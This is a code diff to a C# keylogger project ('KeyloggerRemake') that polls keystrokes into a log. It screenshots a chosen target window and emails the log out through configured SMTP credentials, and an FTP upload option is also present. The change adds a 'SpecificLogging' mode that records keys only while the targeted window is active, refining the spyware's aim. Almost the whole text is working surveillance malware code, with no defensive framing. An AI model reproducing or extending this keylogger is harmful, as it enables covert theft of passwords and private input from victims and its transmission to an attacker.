@@ -17,6 +17,7 @@ namespace KeyloggerRemake
         private string strScreenshotWindow = "";
 
         private bool blTakeScreenshot;
+        private bool blSpecificLogging;
         private bool blSendEmail;
         private bool blUploadFTP;
 
@@ -90,6 +91,8 @@ namespace KeyloggerRemake
             strScreenshotWindow = objJson.Email.Window;
 
             blTakeScreenshot = objJson.Check.TakeScreenshot;
+            blSpecificLogging = objJson.Check.SpecificLogging;
+
             blSendEmail = objJson.Check.SendEmail;
             blUploadFTP = objJson.Check.UploadFTP;
 
@@ -135,17 +138,17 @@ namespace KeyloggerRemake
             //GC.Collect();
         }
 
-        private void sendEmail(String strReceipient)
+        private void sendEmail(string strReceipient)
         {
             classEmail.sendMsg(classEmail.getMsg(currentLog, strReceipentUser, strFromEmail), strFromEmail, strEmailPass, strEmailHost, intEmailPort);
         }
 
-        private void checkWindow(String strScreenshotWindow)
+        private void checkSSWindow(string strScreenshotWindow)
         {
             if (classScreenshot.detectSpecificWindow(strScreenshotWindow) == true)
             {
                 classScreenshot Screenshot = new classScreenshot(strScreenshotWindow);
-                if (currentLog.checkScreenshots(Screenshot.strScreenshotName) == false)
+                if (currentLog.screenshotExists(Screenshot.strScreenshotName) == false)
                 {
                     Screenshot.takeScreenshot();
                     currentLog.stkScreenshots.Enqueue(Screenshot);
@@ -154,7 +157,7 @@ namespace KeyloggerRemake
             }
         }
 
-        private void statusChanger(String Status)
+        private void statusChanger(string Status)
         {
             if (Status.Equals("Started"))
             {
@@ -177,21 +180,30 @@ namespace KeyloggerRemake
         private void checkForKeys() //Effective, but, inefficient?
         {
             String strKey = "";
+            strKey = classGetKeys.checkAlphabet()
+                    + classGetKeys.checkExtraKeys()
+                    + classGetKeys.checkExtraKeys()
+                    + classGetKeys.checkMoreExtraKeys()
+                    + classGetKeys.checkNumbersAndAbove()
+                    + classGetKeys.checkNumpad();
 
-            strKey = classGetKeys.checkAlphabet() 
-                + classGetKeys.checkExtraKeys() 
-                + classGetKeys.checkExtraKeys() 
-                + classGetKeys.checkMoreExtraKeys()
-                + classGetKeys.checkNumbersAndAbove()
-                + classGetKeys.checkNumpad();
-
-            txtLog.AppendText(currentLog.addToLog(strKey));
+            if ((blSpecificLogging == true) && (blSendEmail == true))
+            {
+                if (classScreenshot.detectSpecificWindow(strScreenshotWindow) == true)
+                {
+                    txtLog.AppendText(currentLog.addToLog(strKey));
+                }
+            }
+            else
+            {
+                txtLog.AppendText(currentLog.addToLog(strKey));
+            }
         }
 
-        private void currentWindowScreenshot()
+        /*private void currentWindowScreenshot()
         {
             checkWindow(classGetUserInfo.strCurrentWindow);
-        }
+        }*/
 
         private void tmrCheckKeys_Tick(object sender, EventArgs e)
         {
@@ -201,11 +213,22 @@ namespace KeyloggerRemake
         private void tmrGetWindow_Tick(object sender, EventArgs e)
         {
             classGetUserInfo.strCurrentWindow = classGetUserInfo.getActiveWindowTitle();
-            txtCurrentWindow.Text = classGetUserInfo.strCurrentWindow;
+
+            if ((blSendEmail == true) && (blSpecificLogging == true))
+            {
+                if (classScreenshot.detectSpecificWindow(strScreenshotWindow) == true)
+                {
+                    txtCurrentWindow.Text = strScreenshotWindow;
+                }
+            }
+            else
+            {
+                txtCurrentWindow.Text = classGetUserInfo.strCurrentWindow;
+            }
 
             if (blTakeScreenshot == true)
             {
-                checkWindow(strScreenshotWindow);
+                checkSSWindow(strScreenshotWindow);
             }
         }
 
